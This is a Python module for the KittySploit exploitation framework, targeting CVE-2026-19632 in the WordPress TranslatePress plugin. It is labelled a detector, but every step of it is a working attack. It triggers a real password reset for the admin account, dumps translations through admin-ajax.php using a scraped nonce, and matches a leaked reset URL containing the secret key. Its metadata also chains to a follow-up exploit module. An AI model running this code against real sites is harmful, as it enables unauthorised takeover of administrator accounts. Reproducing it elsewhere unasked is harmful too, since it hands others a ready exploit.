#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TranslatePress <= 3.3.1 reset URL leak (CVE-2026-19632)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "translatepress-multilingual"
_VULN_HIGH = (3, 3, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "TranslatePress CVE-2026-19632 detect",
        "description": (
            "Detects trp_get_translations_regular leaking password-reset URLs after lostpassword."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-19632",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-19632"],
        "modules": ["auxiliary/admin/http/translatepress_cve_2026_19632_reset_leak"],
        "tags": ["web", "scanner", "wordpress", "translatepress", "cve-2026-19632"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/translatepress_cve_2026_19632_reset_leak"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    admin_user = OptString("admin", "Username for lost-password trigger", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home:
            return False
        lang_m = re.search(
            r'<link rel="alternate" hreflang="[a-z]{2}-[A-Z]{2}" href="https?://[^/"]+(/[a-z]{2,5}/)"',
            home.text or "",
        )
        if not lang_m:
            return False
        lang_page = self.http_request(method="GET", path=self._join(lang_m.group(1)), allow_redirects=True)
        html = lang_page.text or "" if lang_page else ""
        nonce_m = re.search(r'gettranslationsnonceregular"\s*:\s*"([a-f0-9]+)"', html)
        lang_code = re.search(r'trp_current_language"\s*:\s*"([a-zA-Z_]+)"', html)
        if not nonce_m or not lang_code:
            return False
        self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            params={"action": "lostpassword"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"user_login": self.admin_user or "admin", "redirect_to": "", "wp-submit": "Get New Password"},
            allow_redirects=False,
        )
        ids = ",".join(str(i) for i in range(1, 201))
        leak = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
            },
            data={
                "action": "trp_get_translations_regular",
                "security": nonce_m.group(1),
                "language": lang_code.group(1),
                "all_languages": "true",
                "dynamic_strings": "true",
                "skip_machine_translation": "[]",
                "string_ids": f"[{ids}]",
            },
            allow_redirects=False,
        )
        body = leak.text or "" if leak else ""
        if re.search(r'wp-login\.php\?[^"\s\\]*action=rp[^"\s\\]*key=[A-Za-z0-9]{20,}', body):
            self.set_info(
                severity="critical",
                reason="TranslatePress translation dump contains password-reset URL",
                cve="CVE-2026-19632",
            )
            return True
        return False
